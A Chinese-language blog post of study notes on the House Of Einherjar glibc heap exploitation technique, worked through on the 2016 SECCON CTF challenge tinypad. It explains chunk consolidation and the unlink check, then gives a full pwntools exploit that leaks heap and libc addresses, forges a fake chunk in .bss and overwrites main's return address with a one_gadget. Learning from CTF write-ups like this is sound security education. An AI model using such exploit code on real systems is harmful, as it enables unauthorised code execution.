---
layout:     post
title:      学习House Of Einherjar
subtitle:   笔记
date:       2020-04-14
author:     X1ng
header-img: House Of Einherjar.jpg
catalog: true
tags:

    - 学习笔记
    - House Of Einherjar

---

# House Of Einherjar 

参考资料：

[九层台's blog](https://blog.csdn.net/qq_38204481/article/details/82318094)

[[qq_33528164's blog](https://me.csdn.net/qq_33528164)]

[ctf-wiki](https://wiki.x10sec.org/pwn/heap/house_of_einherjar/)

## 漏洞介绍

> house of einherjar 是一种堆利用技术，由 `Hiroki Matsukuma` 提出。该堆利用技术可以强制使得 `malloc` 返回一个几乎任意地址的 chunk 。其主要在于滥用 `free` 中的后向合并操作（合并低地址的chunk），从而使得尽可能避免碎片化。

其实就是利用了off by one进行一字节的溢出，修改下一个堆块的`prev_size`和 PREV_INUSE 比特位，滥用 `free` 中的后向合并操作，从而实现chunk任意地址分配

## 预备知识

### 1、堆内存管理中`prev_size`的使用

如果chunk0已被分配（chunk1的PREV_INUSE 比特位为1）的话，则即使对于chunk1来说起始位置依然是`prev_size`，但是chunk1的`prev_size`这段内存将作为chunk0的末尾被使用

![prev_size](https://tva1.sinaimg.cn/large/00831rSTgy1gdj4jqcs1zj30fq0r074m.jpg)

也就是说，我们在对chunk0进行写入的时候，是可以将chunk1的`prev_size`写为任意值的，但是由于chunk1的size中的PREV_INUSE 比特位为1，所以chunk1的`prev_size`将被当作chunk0的data处理

### 2、 `free` 中的向后合并操作

`free` 中向后合并操作的核心代码如下：

```
        /* consolidate backward */
        if (!prev_inuse(p)) {
            prevsize = prev_size(p);
            size += prevsize;
            p = chunk_at_offset(p, -((long) prevsize));
            unlink(av, p, bck, fwd);
        }
```

即释放一个chunk——chunk1时，如果与之相邻的上一个chunk——chunk0未被分配（通过size中的PREV_INUSE 比特位判断），则将两个chunk合并，返回chunk0的地址，成为新的chunk，放在unsorted bin中等待下次分配

![向后合并](https://tva1.sinaimg.cn/large/00831rSTgy1gdj56hqun9j30yq0pyq3z.jpg)

### 3、unlink宏绕过

unlink宏：

```
void unlink(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)
{
FD = P->fd;
BK = P->bk;
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
       malloc_printerr(check_action,"corrupted double-linked list",P);
else
       {
       FD->bk = BK;
       BK->fd = FD;
       }      
}
```

所以如果要让chunk成功unlink的话 就要让`p->fd`和`p->bk`同时为p的地址，才能实现

```
p->fd->bk==p
p->bk->fd==p
```





## 漏洞利用

### 漏洞原理

如果我们能在写入chunk0时将chunk1的size中的PREV_INUSE 比特位覆盖为0的话（由于linux内存小端序的储存方法，只需要实现off by one即可覆盖到PREV_INUSE 比特位），就能在free chunk1时让程序发生向后合并操作，如果我们在写入chunk0时构造`prev_size`为特定的偏移，再在相对偏移处构造一个fake_chunk，程序就会让这个fake_chunk向后合并chunk1，再将新的chunk放入unsorted bin中等待再次分配，在下次`malloc`相应大小的空间的时候就能分配到fake_chunk，这样就能实现所谓的“强制使得 `malloc` 返回一个几乎任意地址的 chunk ”

![attack](https://tva1.sinaimg.cn/large/00831rSTgy1gdj526tgdej30u00zgai5.jpg)

### 例题：[2016 Seccon tinypad](https://pan.baidu.com/s/1pmx5X0H7EZoC-E9fX_Ne1A)

提取码: rt1e 

为了突出学习House Of Einherjar，这里对于其他知识点一笔带过，详细可以参考[这篇博客](https://blog.csdn.net/qq_33528164/article/details/79993399)



ida64打开

程序比较复杂，就不贴伪代码了，可以自行下载elf文件反编译

程序运行流程：

1、add 申请chunk并写入内容，在(`.bss`+0x100)处按顺序保存每一chunk的大小和地址，最多只能创建四个

2、delete 在free之后把size置0

3、edit 将内容写到(`.bss`+0x20)的位置,再用strcpy将内容复制到相应chunk

4、quit 结束程序

漏洞点：

1、在free之后没有将指针清零，存在UAF漏洞

2、自定义的read函数存在off by one 漏洞



所以大致思路是 先通过UAF泄露heap地址和libc地址，再通过House Of Einherjar在(`.bss`+0x40)处伪造fake_chunk，即可复写 保存所有chunk的大小和地址 的数组（因为该数组在`.bss`+0x40不远处），然后填充原本chunk1的位置为environ的地址，泄露计算出main_ret_addr，让chunk1指向main_ret_addr，将`main`函数的返回值地址修改为`one_gadget`地址



重点看一下House Of Einherjar这段漏洞利用代码

（由于程序index从1开始 本文index也从1开始）

```
add(0x18,"d"*0x18)
add(0xf0,"e"*0xf0)
add(0xf0,'f'*0xf8)
add(0x100,"f"*0xf8)

fake_addr=0x602040+0x20
size=heap_base-fake_addr+0x20
print hex(size)
payload="b"*0x20+p64(0x11111111)+p64(0xf1)+p64(fake_addr)*2
edit(3,payload)

for i in range(len(p64(size))-len(p64(size).strip('\x00'))+1):
    edit(1,'a'*0x10+p64(size).strip('\x00').rjust(8-i,'f'))
#edit(1,'a'*0x10+p64(size))
#gdb.attach(p)
delete(2)
p.recvuntil("\nDeleted.")
payload="a"*0x20+p64(0)+p64(0x111)+p64(main_arena)+p64(main_arena)
edit(4,payload)
```



1、`payload="b"*0x20+p64(0x11111111)+p64(0xf1)+p64(fake_addr)*2`处构造fake_chunk，让fd和bk都指向fake_chunk绕过unlink的检验

2、在`edit(3,payload)`处将fake_chunk写入内存中，但是由于程序先将edit的内容写到`bss+0x20`处，再使用strcpy函数时被`\x00`截断，fake_chunk并没有被写入chunk3中，所以实际是在(`.bss`+0x40)处构造fake_chunk

3、`for i in range(len(p64(size))-len(p64(size).strip('\x00'))+1)`处这一循环是由于strcpy函数复制时被`\x00`截断，而要写入偏移地址需要在高位填充`\x00`，于是可以利用strcpy函数拷贝字符串时给字符串末尾加上的`\x00`进行填充

4、`payload="a"*0x20+p64(0)+p64(0x111)+p64(main_arena)+p64(main_arena)`处是对fake_chunk进行修正，因为在unsorted bin中只有一个chunk时，其fd和bk都应指向(main_arena + 0x88)



完整exp如下：

```
from pwn import *
context.log_level="debug"
p=process("tinypad")
elf=ELF("./tinypad")
libc=ELF("./libc.so.6")
offset=0x3c4b78
def add(size,content):
    p.recvuntil("(CMD)>>> ")
    p.sendline("A")
    p.recvuntil("(SIZE)>>> ")
    p.sendline(str(size))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(content)

def delete(index):
    p.recvuntil("(CMD)>>> ")
    p.sendline("D")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(index))
    #size=0,p!=NULL
    #\x00

def edit(index,content):
    p.recvuntil("(CMD)>>> ")
    p.sendline("E")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(index))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(content)
    p.recvuntil("(Y/n)>>> ")
    p.sendline("Y")



add(0x10, 'a') 
add(0x10,"b")
add(0x100,"c")
delete(2)
delete(1)
p.recvuntil(" # CONTENT: ")
heap_base=u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-0x20
print "heap_base="+hex(heap_base)
#gdb.attach(p)
#x /10xg 0x602140
delete(3)
p.recvuntil(" # CONTENT: ")
main_arena=u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print "main_arena="+hex(main_arena)
libc_base=main_arena-offset
print "libc_base="+hex(libc_base)

# house of einherjar
add(0x18,"d"*0x18)
add(0xf0,"e"*0xf0)
add(0xf0,'f'*0xf8)
add(0x100,"f"*0xf8)

fake_addr=0x602040+0x20
size=heap_base-fake_addr+0x20
print hex(size)
payload="b"*0x20+p64(0x11111111)+p64(0xf1)+p64(fake_addr)*2
edit(3,payload)

for i in range(len(p64(size))-len(p64(size).strip('\x00'))+1):
    edit(1,'a'*0x10+p64(size).strip('\x00').rjust(8-i,'f'))

#edit(1,'a'*0x10+p64(size))
#gdb.attach(p)
delete(2)
p.recvuntil("\nDeleted.")
payload="a"*0x20+p64(0)+p64(0x111)+p64(main_arena)+p64(main_arena)
edit(4,payload)
#gdb.attach(p)
getgat=libc_base+0x45216
environ_point=libc_base+libc.symbols['__environ']
payload="A"*0xd0+p64(0x100)+p64(environ_point)+p64(0x100)+p64(0x602148)
add(0x100,payload)
#gdb.attach(p)
p.recvuntil(" # CONTENT: ")
environ_addr=u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print "environ_addr="+hex(environ_addr)
main_ret_addr=environ_addr-30*8
print "main_ret _addr="+hex(main_ret_addr)
gdb.attach(p)
edit(2,p64(main_ret_addr))
edit(1,p64(getgat))
p.sendline("q")
p.interactive()

```



## 总结

house of einherjar其实就是让程序在malloc时，可以分配到任意的地址，结合其他利用手段，可以产生巨大威力
